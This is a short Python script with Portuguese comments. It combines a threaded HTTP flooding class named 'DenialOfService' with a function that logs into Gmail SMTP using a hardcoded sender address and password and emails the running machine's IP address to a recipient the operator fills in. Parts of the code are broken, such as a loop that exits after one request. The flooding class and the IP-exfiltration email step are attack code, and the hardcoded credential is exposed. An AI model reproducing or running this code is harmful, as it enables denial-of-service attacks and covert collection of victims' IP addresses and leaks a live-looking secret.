import socket, threading, smtplib, os, time, sys
import email.message
host = socket.gethostname()
IP = socket.gethostbyname(host)
#os.system('clear')
os.system('cls')
#desça...
#nome


class DenialOfService(object):
    def __init__(self, target=f'{IP}', port=80, ip_mask="182.21.20.32"):
        self.target = target
        self.port = port
        self.ip_mask = ip_mask
        

    def run(self):        
        for i in range(2000):
            thread = threading.Thread(target=self.attack).start()

    print('CARREGANDO (ISTO PODE DEMORAR UM POUCO...)')
    def attack(self):
        while True:
            
            #os.system('clear')
            
            connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connection.connect((self.target, self.port))
            connection.sendto((f"GET /{self.target} HTTP/1.1\r\n").encode("ascii"), (self.target, self.port))
            connection.sendto((f"Host: {self.ip_mask}\r\n\r\n").encode("ascii"), (self.target, self.port))
            connection.close()
        
            break
if __name__ == "__main__":
    DenialOfService().run()

#email
def enviar_email():
    corpo_email = f'IP: {IP}'
    
 
    msg = email.message.Message()
    msg['Subject'] = '☠'
    msg['From'] = 'ipcylughtool@gmail.com'
    msg['To'] = 'COLOQUE O SEU EMAIL AQUI'
    password = 'svpzullpcdtgtkrf'
    msg.add_header ('Content-Type', 'text/html')
    msg.set_payload(corpo_email )
#login
    s = smtplib.SMTP('smtp.gmail.com: 587')
    s.starttls()
    # Login Credentials for sending the mail
    s.login(msg['From'], password)
    s.sendmail(msg['From'], [msg['To']], msg.as_string().encode('utf-8'))
enviar_email()